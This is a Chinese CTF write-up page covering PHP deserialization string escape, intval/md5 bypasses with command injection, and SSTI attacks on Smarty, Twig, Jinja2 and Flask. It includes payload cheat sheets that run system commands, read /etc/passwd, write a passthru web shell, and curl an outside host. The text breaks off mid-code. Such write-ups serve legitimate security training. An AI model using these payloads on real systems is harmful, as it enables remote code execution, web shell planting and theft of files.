<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">过程：</span><br><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">$function = @$_GET[&#x27;f&#x27;];</span><br><span class="line"></span><br><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);</span><br><span class="line">    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;</span><br><span class="line">    return preg_replace($filter,&#x27;&#x27;,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_SESSION)&#123;</span><br><span class="line">    unset($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;</span><br><span class="line">$_SESSION[&#x27;function&#x27;] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line">if(!$function)&#123;</span><br><span class="line">    echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!$_GET[&#x27;img_path&#x27;])&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));//序列化之后使用filter方法</span><br><span class="line"></span><br><span class="line">if($function == &#x27;highlight_file&#x27;)&#123;</span><br><span class="line">    highlight_file(&#x27;index.php&#x27;);</span><br><span class="line">&#125;else if($function == &#x27;phpinfo&#x27;)&#123;</span><br><span class="line">    eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!</span><br><span class="line">&#125;else if($function == &#x27;show_image&#x27;)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));//这里有file_get_contents，可以通过它读取我们想要的文件</span><br><span class="line">&#125; </span><br><span class="line">step2:</span><br><span class="line">先对$_SESSION序列化</span><br><span class="line">&lt;?php</span><br><span class="line">class a&#123;</span><br><span class="line">public $user=&quot;guest&quot;;</span><br><span class="line">public $function=&quot;jsaK&quot;;</span><br><span class="line">public $img=&quot;ZDBnM19mMWFnLnBocA==&quot;;//d0g3_f1ag.php的base64</span><br><span class="line">&#125;</span><br><span class="line">echo serialize(new a);</span><br><span class="line">?&gt;</span><br><span class="line">得到:</span><br><span class="line">O:1:&quot;a&quot;:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:4:&quot;jsaK&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br><span class="line">我们要这一块(s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;)到(s:8:&quot;function&quot;;s:4:&quot;jsaK&quot;)这个位置来</span><br><span class="line">我们先把s:;3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;赋值给function;序列化后得到：</span><br><span class="line">O:1:&quot;a&quot;:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:39:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br><span class="line">我们现在就要使用字符串逃逸把 &quot;;s:8:&quot;function&quot;;s:39: 变成user的值</span><br><span class="line">数一下 &quot;;s:8:&quot;function&quot;;s:39: 有22位，利用filter的函数把user的值改为phpphpflagflagflagflag 这要原本user的值变成空,然后自动往后面读22位将 &quot;;s:8:&quot;function&quot;;s:39: 变成user的值，自然的，function的位置变成了img键及内容为ZDBnM19mMWFnLnBocA==;</span><br><span class="line">O:1:&quot;a&quot;:3:&#123;s:4:&quot;user&quot;;s:22:&quot;phpphpflagflagflagflag&quot;;s:8:&quot;function&quot;;s:40:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br><span class="line">注意到&quot;a&quot;:3:就是说&#123;&#125;里面应该有三个键,但是在&#123;&#125;里面只有两个，我们要给他手动加一个s:1:&quot;a&quot;;s:1:&quot;a&quot;;</span><br><span class="line">这样我们就能读取d0g3_f1ag.php的内容了</span><br><span class="line">payload:</span><br><span class="line">url/?f=get_image</span><br><span class="line">POST    _SESSION[user]=phpphpflagflagflagflag&amp;_SESSION[funciton]=;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;&#125;</span><br><span class="line">传入之后回显</span><br><span class="line">&lt;?php</span><br><span class="line">$flag = &#x27;flag in /d0g3_fllllllag&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">同样的我们去读取/d0g3_fllllllag，发现base64之后也是20位</span><br><span class="line">payload:</span><br><span class="line">POST</span><br><span class="line">_SESSION[user]=phpphpflagflagflagflag&amp;_SESSION[funciton]=;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;&#125;</span><br><span class="line">就可以拿到flag了</span><br></pre></td></tr></table></figure>

<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h3><h4 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.使用科学计数法绕过intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021</span><br><span class="line">2.$a==md5($a)</span><br><span class="line">md5=0e215962017</span><br></pre></td></tr></table></figure>

<h4 id="解题步骤："><a href="#解题步骤：" class="headerlink" title="解题步骤："></a>解题步骤：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">step1:收集信息，robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /fAke_f1agggg.php</span><br><span class="line">访问之后再url/fAke_f1agggg.php的响应头里看到Look_at_me：/fl4g.php</span><br><span class="line">访问之后得到源码：</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">step2:</span><br><span class="line">&lt;img src=&quot;/img.jpg&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">header(&#x27;Content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//level 1</span><br><span class="line">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;</span><br><span class="line">        echo &quot;鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;鍘婚潪娲插惂&quot;);</span><br><span class="line">&#125;</span><br><span class="line">//level 2</span><br><span class="line">if (isset($_GET[&#x27;md5&#x27;]))&#123;</span><br><span class="line">   $md5=$_GET[&#x27;md5&#x27;];</span><br><span class="line">   if ($md5==md5($md5))</span><br><span class="line">       echo &quot;鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.&lt;/br&gt;&quot;;</span><br><span class="line">   else</span><br><span class="line">       die(&quot;鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;鍘婚潪娲插惂&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//get flag</span><br><span class="line">if (isset($_GET[&#x27;get_flag&#x27;]))&#123;</span><br><span class="line">    $get_flag = $_GET[&#x27;get_flag&#x27;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);</span><br><span class="line">        echo &quot;鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.&lt;/br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;蹇埌闈炴床浜�&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;鍘婚潪娲插惂&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">step3:</span><br><span class="line">payload:</span><br><span class="line">/fl4g.php?num=1e5&amp;md5=0e215962017&amp;get_flag=ls</span><br><span class="line">/fl4g.php?num=2e5&amp;md5=0e215962017&amp;get_flag=tac$IFS$6fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure>

<h2 id="ssti模板注入"><a href="#ssti模板注入" class="headerlink" title="ssti模板注入"></a>ssti模板注入</h2><h4 id="在检测到存在SSTI模板注入漏洞之后-获得内置类所对应的类-获得object基类-获得所有子类-获得可以执行shell命令的子类-找到该子类可以执行shell命令的方法-执行shell命令"><a href="#在检测到存在SSTI模板注入漏洞之后-获得内置类所对应的类-获得object基类-获得所有子类-获得可以执行shell命令的子类-找到该子类可以执行shell命令的方法-执行shell命令" class="headerlink" title="在检测到存在SSTI模板注入漏洞之后-&gt;获得内置类所对应的类-&gt;获得object基类-&gt;获得所有子类-&gt;获得可以执行shell命令的子类-&gt;找到该子类可以执行shell命令的方法-&gt;执行shell命令"></a>在检测到存在SSTI模板注入漏洞之后-&gt;获得内置类所对应的类-&gt;获得object基类-&gt;获得所有子类-&gt;获得可以执行shell命令的子类-&gt;找到该子类可以执行shell命令的方法-&gt;执行shell命令</h4><h4 id="贴一个董姐的笔记-https-www-yuque-com-u41052087-wbs5gp-zvprevnbn24cxer7-amEn4"><a href="#贴一个董姐的笔记-https-www-yuque-com-u41052087-wbs5gp-zvprevnbn24cxer7-amEn4" class="headerlink" title="贴一个董姐的笔记:https://www.yuque.com/u41052087/wbs5gp/zvprevnbn24cxer7#amEn4"></a>贴一个董姐的笔记:<a target="_blank" rel="noopener" href="https://www.yuque.com/u41052087/wbs5gp/zvprevnbn24cxer7#amEn4">https://www.yuque.com/u41052087/wbs5gp/zvprevnbn24cxer7#amEn4</a></h4><h3 id="BJDCTF2020-Cookie-is-so-stable-Twig"><a href="#BJDCTF2020-Cookie-is-so-stable-Twig" class="headerlink" title="[BJDCTF2020]Cookie is so stable(Twig)"></a>[BJDCTF2020]Cookie is so stable(Twig)</h3><h4 id="知识点-10"><a href="#知识点-10" class="headerlink" title="知识点"></a>知识点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssti:https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig</span><br></pre></td></tr></table></figure>

<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">smarty:</span><br><span class="line">&#123;if readfile(&#x27;/flag&#x27;)&#125;&#123;/if&#125; smarty中的&#123;if&#125;标签中可以执行php语句</span><br><span class="line">&#123;$smarty.version&#125; 返回版本信息</span><br><span class="line">$&#123;smarty.template&#125; 返回当前模板的文件名</span><br><span class="line">使用&#123;php&#125;&#123;/php&#125;标签来执行被包裹其中的php指令 3.1版本已经废弃</span><br><span class="line">&#123;self::getStreamVariable(“file:///etc/passwd”)&#125;</span><br><span class="line">&#123;literal&#125;alert(&#x27;xss&#x27;);&#123;/literal&#125;</span><br><span class="line">&#123;literal&#125;&lt;script language=&quot;php&quot;&gt;phpinfo();&lt;/script&gt;&#123;/literal&#125; PHP 5.x</span><br><span class="line">&#123;system(&quot;id&quot;)&#125; 最简单,枯燥的一个</span><br><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,self::clearConfig())&#125;</span><br><span class="line"> </span><br><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&#x27;ls&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123; readfile(&#x27;/flag&#x27;) &#125;</span><br><span class="line">&#123;if show_source(&#x27;/flag&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&#x27;cat ../../../flag&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;php&#125;echo `id`;&#123;/php&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">twig:</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;system&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&#x27;cat /flag&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)|join(&quot;,&quot;)</span><br><span class="line">&#123;&#123;[&quot;id&quot;, 0]|sort(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[0, 0]|reduce(&quot;system&quot;, &quot;id&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;&quot;&lt;?php phpinfo();&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;/etc/passwd&#x27;|file_excerpt(-1,-1)&#125;&#125;</span><br><span class="line">&#123;&#123;app.request.query.filter(0,&#x27;curl$&#123;IFS&#125;x.x.x.x:8090&#x27;,1024,&#123;&#x27;options&#x27;:&#x27;system&#x27;&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">jinja2:</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">    &#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">      &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">      &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">        &#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">          &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">      &#123;% endif %&#125;</span><br><span class="line">      &#123;% endfor %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">    &#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>



<h4 id="解题过程：-15"><a href="#解题过程：-15" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">在flag.php有输入框，测试之后发现不是sql，尝试模板注入</span><br><span class="line">step2:</span><br><span class="line">测试&#123;&#123;7*&#x27;7&#x27;&#125;&#125;回显49,确定是Twig</span><br><span class="line">step3：</span><br><span class="line">继续注入，尝试一些&#123;&#123;&#125;&#125;包着的命令之后，没回显，继续输入&#123;&#123;7*&#x27;7&#x27;&#125;&#125;submit后抓包看一下，发现注入点是在cookie的user里面</span><br><span class="line">*step4:</span><br><span class="line">/看的别人的payload，还不太清楚怎么来的 附上图片/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="WesternCTF2018-shrine-Twig"><a href="#WesternCTF2018-shrine-Twig" class="headerlink" title="[WesternCTF2018]shrine(Twig)"></a>[WesternCTF2018]shrine(Twig)</h3><h4 id="考点：-8"><a href="#考点：-8" class="headerlink" title="考点："></a>考点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.代码审计</span><br><span class="line">2.ssti注入</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-16"><a href="#解题过程：-16" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">step1:整理代码+审计</span><br><span class="line">import flask  </span><br><span class="line">import os  </span><br><span class="line">  </span><br><span class="line">app = flask.Flask(__name__)  </span><br><span class="line">  </span><br><span class="line"># 从环境变量中取出FLAG并设置到应用的配置中  </span><br><span class="line">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;, None)  # 添加了默认值None，以防环境变量中不存在FLAG  </span><br><span class="line">  </span><br><span class="line">@app.route(&#x27;/&#x27;)  </span><br><span class="line">def index():  </span><br><span class="line">    # 返回当前文件的全部内容  </span><br><span class="line">    return open(__file__).read()  </span><br><span class="line">  </span><br><span class="line">@app.route(&#x27;/shrine/&lt;shrine&gt;&#x27;)  </span><br><span class="line">def shrine(shrine):  </span><br><span class="line">    def safe_jinja(s):  </span><br><span class="line">        # 移除字符串中的括号，因为括号在Jinja2模板中可能有特殊含义  </span><br><span class="line">        s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)  </span><br><span class="line">          </span><br><span class="line">        # 定义一个黑名单，包含不允许在模板中直接访问的变量名  </span><br><span class="line">        blacklist = [&#x27;config&#x27;, &#x27;self&#x27;]  </span><br><span class="line">          </span><br><span class="line">        # 构造一个Jinja2模板字符串，用于将黑名单中的变量设置为None  </span><br><span class="line">        # 这可以防止模板执行时访问到不安全的变量  </span><br><span class="line">        template_prefix = &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist])  </span><br><span class="line">          </span><br><span class="line">        # 返回处理后的模板字符串  </span><br><span class="line">        return template_prefix + s  </span><br><span class="line">      </span><br><span class="line">    # 使用safe_jinja函数处理传入的shrine参数，并渲染为模板  </span><br><span class="line">    return flask.render_template_string(safe_jinja(shrine))  </span><br><span class="line">  </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:  </span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">step2：</span><br><span class="line">是jinja2模板然后过滤了config,self,我们得去读配置文件	</span><br><span class="line">就利用&#123;&#123;url_for.__globals__&#125;&#125;这个去读一下全局变量读出来得去锁定我们要的，注意到它</span><br><span class="line">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;, None) 要去读取app.config</span><br><span class="line">在里面搜素app看到current_app</span><br><span class="line">payload：&#123;&#123;url_for.__globals__[current_app].config&#125;&#125;就可以了</span><br></pre></td></tr></table></figure>



<h2 id="RCE-2"><a href="#RCE-2" class="headerlink" title="RCE"></a>RCE</h2><h3 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h3><h4 id="知识点-11"><a href="#知识点-11" class="headerlink" title="知识点"></a>知识点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.当遇到MD5强比较并且进行了string强转例如：(string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])</span><br><span class="line">固定payload：</span><br><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-17"><a href="#解题过程：-17" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">一打开注意到url上有cmd=，发现尝试在cmd上注入1/a之类的直接回显在源代码上，当注入ls等命令的时候则会回显是禁止的</span><br><span class="line">step2:</span><br><span class="line">找源代码，注意到url上有index.php，但是发现怎么都访问不进去，然后注意到有一个变量img=MzUzNTM1MmU3MDZlNjc=,经过两次base64解密一次hex解密之后得到555.png,注意到页面上有一个表情包，以及那个源代码里，有图片的base编码，所以可能更改img的值可能在源代码那块读到我们想要的</span><br><span class="line">step3：</span><br><span class="line">将index经过同样两次编码之后将它注入进去，在前端的那个页面看到了base64更新之后，在进行编码得到我们的源代码</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span 